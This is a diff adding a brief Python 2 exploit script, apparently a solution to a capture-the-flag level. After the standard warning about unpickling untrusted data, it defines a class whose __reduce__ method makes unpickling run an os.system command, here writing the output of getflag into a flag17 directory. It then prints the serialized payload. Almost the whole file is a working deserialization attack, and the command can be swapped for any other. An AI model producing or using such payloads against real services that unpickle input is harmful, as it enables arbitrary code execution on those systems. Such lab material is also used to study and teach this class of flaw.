@@ -1,0 +1,12 @@
+Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
+
+
+import cPickle
+import subprocess
+import os
+
+class Exploit(object):
+  def __reduce__(self):
+    return (os.system, ("/bin/getflag > /home/flag17/out",))
+
+print cPickle.dumps(Exploit())
